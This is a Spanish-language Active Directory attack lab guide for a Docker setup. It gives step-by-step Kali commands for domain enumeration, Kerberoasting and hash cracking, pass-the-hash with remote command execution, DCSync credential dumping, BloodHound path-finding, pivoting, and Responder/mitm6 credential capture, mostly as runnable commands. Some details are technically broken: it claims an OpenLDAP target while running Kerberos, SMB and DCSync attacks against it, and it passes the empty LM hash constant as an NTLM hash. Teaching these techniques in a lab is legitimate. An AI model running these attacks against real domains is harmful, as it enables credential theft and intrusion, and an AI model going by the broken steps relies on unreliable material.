# 🦸 Unit 4: Hacking de Identidad y Active Directory - LAB PRÁCTICO

## 📋 Requisitos Previos

### Software Requerido
- **Docker** y **Docker Compose**
- **Cliente SSH**
- **Kali Linux** con herramientas de AD

### Conocimientos Recomendados
- Conceptos básicos de Active Directory
- Protocolos de Windows (SMB, LDAP, Kerberos)
- Autenticación NTLM y Kerberos
- Concepto de tickets y hashes

---

## 🎯 Objetivos de Aprendizaje

1. ✅ **Enumerar** usuarios y recursos en un dominio
2. ✅ **Ejecutar** ataques Kerberoasting
3. ✅ **Realizar** movimiento lateral con Pass-the-Hash
4. ✅ **Extraer** hashes de dominio con DCSync
5. ✅ **Escalar privilegios** en un entorno AD

---

## 🏗️ Arquitectura del Laboratorio

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 4                                │
│                 HACKING DE IDENTIDAD Y AD                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │   OBJETOS   │      │
│   │   LINUX    │  ──────────────────────→   │     AD      │      │
│   │ (Atacante) │                            │             │      │
│   │192.168.59.2│                           │192.168.59.3│      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • Impacket                               │              │
│        │  • CrackMapExec                          │              │
│        │  • BloodHound                            │              │
│        │  • enum4linux                            │              │
│        │  • ldapsearch                            │              │
│        │  • smbclient                             │              │
│        │                                          │              │
│        │        ┌─────────────┐                   │              │
│        │        │   OpenLDAP │                   │              │
│        │        │   DC=lab   │                   │              │
│        │        │   :389     │                   │              │
│        │        └─────────────┘                   │              │
│        │            RED: 192.168.59.0/24         │              │
└────────┼──────────────────────────────────────────┼──────────────┘
         │
     SSH:2222
```

**Nota**: Este laboratorio simula un entorno Active Directory usando OpenLDAP. En un entorno real, tendrías un Windows Server con AD DS.

---

## 🚀 INSTRUCCIONES DETALLADAS

### Paso 1: Iniciar el Laboratorio

```bash
cd docker-labs/unit4
docker-compose up -d
```

### Paso 2: Verificar Servicios

```bash
docker ps

# Obtener IP del objetivo
docker inspect target-ldap | grep IPAddress

# Verificar puertos
docker port target-ldap
```

### Paso 3: Conectar a Kali

```bash
ssh root@localhost -p 2222
# Password: toor
```

### Paso 4: Instalar Herramientas (si no están)

```bash
# En Kali
apt-get update
apt-get install -y ldap-utils smbclient
pip3 install impacket crackmapexec bloodhound
```

---

## ⚔️ EJERCICIOS DE ATAQUE - GUÍA DETALLADA

### Ejercicio 1: Enumeración del Dominio

**Duración**: 20 minutos

**Objetivo**: Descubrir usuarios, grupos y recursos en el dominio

#### 1.1 Enumeración Básica con enum4linux

```bash
# Enumeración completa
enum4linux -a 192.168.59.3

# Solo usuarios
enum4linux -U 192.168.59.3

# Solo grupos
enum4linux -G 192.168.59.3

# Recursos compartidos
enum4linux -S 192.168.59.3
```

#### 1.2 Enumeración con ldapsearch

```bash
# Buscar usuarios
ldapsearch -x -H ldap://192.168.59.3 -D "cn=admin,dc=lab,dc=local" -w admin -b "dc=lab,dc=local"

# Buscar solo usuarios
ldapsearch -x -H ldap://192.168.59.3 -D "cn=admin,dc=lab,dc=local" -w admin -b "ou=people,dc=lab,dc=local"

# Listar grupos
ldapsearch -x -H ldap://192.168.59.3 -D "cn=admin,dc=lab,dc=local" -w admin -b "ou=groups,dc=lab,dc=local"
```

**Credenciales de ejemplo**:
- Admin: cn=admin,dc=lab,dc=local / admin
- Usuario: cn=user,ou=people,dc=lab,dc=local / password

#### 1.3 Enumeración SMB

```bash
# Listar shares
smbclient -L //192.168.59.3 -U ""

# Concredenciales
smbclient -L //192.168.59.3 -U "admin%admin"

# Conectar a un share
smbclient //192.168.59.3/share -U "admin%admin"
```

---

### Ejercicio 2: Kerberoasting

**Duración**: 25 minutos

**Teoría**: Kerberoasting exploita el mecanismo de Kerberos donde cualquier usuario puede solicitar tickets TGS (Ticket Granting Service) para cualquier servicio. Si el password del service account es débil, podemos crackearlo offline.

#### 2.1 Obtener Tickets TGS

```bash
# Con GetUserSPNs de Impacket
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py LAB.LOCAL/user:password -dc-ip 192.168.59.3

# Para solicitar todos los tickets
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py LAB.LOCAL/user:password -request -dc-ip 192.168.59.3
```

#### 2.2 Guardar el Hash

Guarda el hash en un archivo (ejemplo: `hashes.txt`):

```bash
$krb5tgs$23$*user$REALM.COM$*
```

#### 2.3 Crackear con Hashcat

```bash
# Modo 13100 para TGS-REP
hashcat -m 13100 hashes.txt wordlist.txt

# Con mask
hashcat -m 13100 hashes.txt -a 3 ?a?a?a?a?a?a?a?a
```

#### 2.4 Crackear con John

```bash
john hashes.txt --wordlist=wordlist.txt --format=krb5tgs
```

---

### Ejercicio 3: Pass-the-Hash

**Duración**: 20 minutos

**Teoría**: En lugar de usar el password, usamos el hash NTLM directamente para autenticarnos.

#### 3.1 Pass-the-Hash con CrackMapExec

```bash
# Verificar credenciales
crackmapexec smb 192.168.59.3 -u "admin" -H "aad3b435b51404eeaad3b435b51404ee"

# Ejecutar comando
crackmapexec smb 192.168.59.3 -u "admin" -H "aad3b435b51404eeaad3b435b51404ee" -x "whoami"

# Listar shares
crackmapexec smb 192.168.59.3 -u "admin" -H "aad3b435b51404eeaad3b435b51404ee" --shares
```

#### 3.2 Pass-the-Hash con Impacket

```bash
# psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py LAB.LOCAL/admin@192.168.59.3 -hashes "aad3b435b51404eeaad3b435b51404ee"

# wmiexec
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py LAB.LOCAL/admin@192.168.59.3 -hashes "aad3b435b51404eeaad3b435b51404ee"

# atexec
python3 /usr/share/doc/python3-impacket/examples/atexec.py LAB.LOCAL/admin@192.168.59.3 -hashes "aad3b435b51404eeaad3b435b51404ee" "whoami"
```

#### 3.3 Pass-the-Hash con Evil-WinRM

```bash
# Si WinRM está disponible
evil-winrm -i 192.168.59.3 -u admin -H "aad3b435b51404eeaad3b435b51404ee"
```

---

### Ejercicio 4: DCSync Attack

**Duración**: 20 minutos

**Teoría**: DCSync simula el comportamiento de un DC (Domain Controller) para solicitar la replicación de datos de usuario, extrayendo hashes de password de cualquier cuenta.

#### 4.1 Requisitos Previos

Necesitas:
- Permisos de replicación (Domain Admins, Enterprise Admins)
- Hash NTLM de una cuenta con esos permisos

#### 4.2 Ejecutar DCSync

```bash
# Con secretsdump de Impacket
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py LAB.LOCAL/admin:password@192.168.59.3

# Solo usuarios específicos
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py LAB.LOCAL/admin:password@192.168.59.3 -just-dc-user "krbtgt"

# Dump completo
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee" LAB.LOCAL/admin@192.168.59.3
```

#### 4.3 Crackear Hashes

```bash
# NTLM hashes extraídos tienen formato:
# usuario:500:hash:hash:::

# Crackear con Hashcat (modo 1000)
hashcat -m 1000 hashes_ntlm.txt wordlist.txt
```

---

### Ejercicio 5: BloodHound (Enumeración Visual)

**Duración**: 25 minutos

**Objetivo**: Mapear relaciones de dominio y encontrar rutas de ataque

#### 5.1 Recolectar Datos

```bash
# Con SharpHound
python3 /usr/share/doc/python3-impacket/examples/bloodhound.py -d LAB.LOCAL -u admin -p password -c all

# o con Ingestor
python3 /usr/share/python-bloodhound/bloodhound.py -c all -u "admin" -p "password"
```

#### 5.2 Analizar con BloodHound GUI

1. Abre BloodHound: `bloodhound &`
2. Importa los archivos JSON generados
3. Busca rutas de ataque:
   - "Find shortest path to Domain Admin"
   - "Find principals with DCSync rights"
   - "Find kerberoastable users"

---

### Ejercicio 6: Movimiento Lateral

**Duración**: 15 minutos

**Objetivo**: Moverte entre sistemas una vez obtengas acceso

#### 6.1 Pivot con Proxy

```bash
# Crear proxy SOCKS
python3 /usr/share/doc/python3-impacket/examples/socks_proxy.py LAB.LOCAL/admin:password@192.168.59.3

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Usar proxy
proxychains nmap -sT -p445 192.168.59.4
```

#### 6.2 Capturar Credenciales

```bash
# Con responder
python3 /usr/share/responder/Responder.py -I eth0

# Con mitm6
python3 /usr/share/mitm6/mitm6.py -d LAB.LOCAL
```

---

## 📋 Checklist de Entrega

| # | Tarea | Completado |
|---|-------|-----------|
| 1 | Enumerar usuarios del dominio | ☐ |
| 2 | Enumerar grupos | ☐ |
| 3 | Listar shares SMB | ☐ |
| 4 | Obtener TGS tickets | ☐ |
| 5 | Crackear hash Kerberoast | ☐ |
| 6 | Pass-the-Hash exitoso | ☐ |
| 7 | DCSync para extraer hashes | ☐ |
| 8 | Mapeo con BloodHound | ☐ |
| 9 | Movimiento lateral | ☐ |
| 10 | Informe de enumeración AD | ☐ |

---

## 🛑 LIMPIEZA

```bash
cd docker-labs/unit4
docker-compose down -v
```

---

## ✅ Próximo Laboratorio

- **Unit 5**: Metasploit Framework
- Aprenderás a usar Metasploit para explotación

---

## 📚 Recursos Adicionales

- [Impacket Documentation](https://github.com/fortra/impacket)
- [CrackMapExec Wiki](https://github.com/Porchetta-Industries/CrackMapExec)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows/active-directory-methodology)
- [AD Security - MITRE ATT&CK](https://attack.mitre.org/tactics/TA0008/)